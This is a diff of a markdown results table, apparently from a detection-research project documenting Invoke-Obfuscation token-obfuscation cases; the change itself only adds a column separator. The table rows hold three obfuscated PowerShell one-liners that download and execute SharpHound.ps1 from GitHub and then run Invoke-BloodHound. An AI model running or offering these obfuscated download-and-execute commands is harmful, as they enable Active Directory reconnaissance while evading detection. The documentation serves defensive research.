@@ -49,7 +49,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
 ### TOKEN OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
 | Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
-| :---: | :---: | :---: | :---: | :--- |
+| :---: | :---: | :---: | :---: | :--- | :--- |
 | 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound 
 | 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(("{16}{2}{17}{26}{10}{0}{3}{19}{7}{9}{6}{5}{8}{20}{23}{4}{18}{12}{24}{22}{11}{1}{25}{21}{13}{15}{14}"-f 'ntent.com/Blo','s/','/','o','441','ea5363870','nd/a7','ood','d92','Hou','.githubuserco','Ingestor','38b','und.p','1','s','https:','/r','a361f','dHoundAD/Bl','5bc3','o','aadd0b/','1d3a','0','SharpH','aw')); Invoke-BloodHound 
 | 3 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\1 | i`N`VOKe-E`xpRe`S`SIOn (new-`obJE`cT Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); InVoKe-b`l`OOdH`o`U`ND 
